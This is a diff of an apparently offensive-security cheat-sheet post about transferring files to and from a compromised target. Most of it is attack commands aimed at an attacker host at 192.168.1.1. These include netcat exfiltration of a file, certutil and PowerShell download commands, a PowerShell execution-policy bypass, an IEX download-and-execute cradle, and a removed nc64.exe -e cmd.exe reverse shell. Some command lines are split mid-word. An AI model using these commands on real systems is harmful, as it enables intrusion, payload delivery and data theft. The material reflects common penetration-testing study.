@@ -10,31 +10,39 @@ layout: post
 ```
 Python3
 > sudo python3 -m http.server 80
-
 Python2
 > sudo python -m SimpleHTTPServer 80
 ```
 
-
-###### File uploads to target
+###### SMBserver
 ```
-impacket-smbserver.py
-```
-
-###### File uploads on target system
-```
-netcat
-\\192.168.1.1\nc64.exe 192.168.1.1 80 -e cmd.exe
-
-certutil
-certutil.exe -urlcache -f http://192.168.1.1/file.txt file.txt
-
-Using powershell
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1:80/file.txt', 'C\file.txt')
+impacket-smbserver.py secure .
+impacket-smbserver.py secure . -smb2support
 ```
 
-###### File downloads from target
+###### netcat
 ```
-netcat
-nc -nvlp 80 < file.txt
+On the attacker system:
+> nc -lvp 80 > file.txt
+On the target system:
+> nc 192.168.1.1 80 < file.txt
+```
+
+###### certutil
+```
+> certutil.exe -urlcache -f http://192.168.1.1/file.txt file.txt
+```
+
+###### Powershell
+```
+Download
+> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/file.exe', 'C\file.exe')
+
+Execute
+> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoPro
+file -File file.ps1
+
+Download and execute
+> powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('
+http://192.168.1.1/file.exe')
 ```
